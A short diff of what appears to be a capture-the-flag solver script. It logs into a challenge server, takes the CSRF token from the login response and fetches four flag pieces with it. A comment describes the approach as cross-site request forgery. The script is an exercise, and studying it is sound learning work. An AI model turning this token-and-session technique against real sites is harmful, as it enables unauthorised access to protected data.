@@ -10,8 +10,8 @@ flag = ""
 for i in range (0,4):
         session = requests.Session()
         resp = session.post(url + '/login', json=json)
-        r = session.get(url + '/flag_piece?index=' + str(i) + '&csrf=' + str(j.loads(resp.text)['csrf']))
-        flag += j.loads(r.text)['flag_piece']
+        resp = session.get(url + '/flag_piece?index=' + str(i) + '&csrf=' + str(j.loads(resp.text)['csrf']))
+        flag += j.loads(resp.text)['flag_piece']
 print(flag)
         
 # We have to do a Cross Site Request Forgery, so we must obtain the csrf token and a session cookie
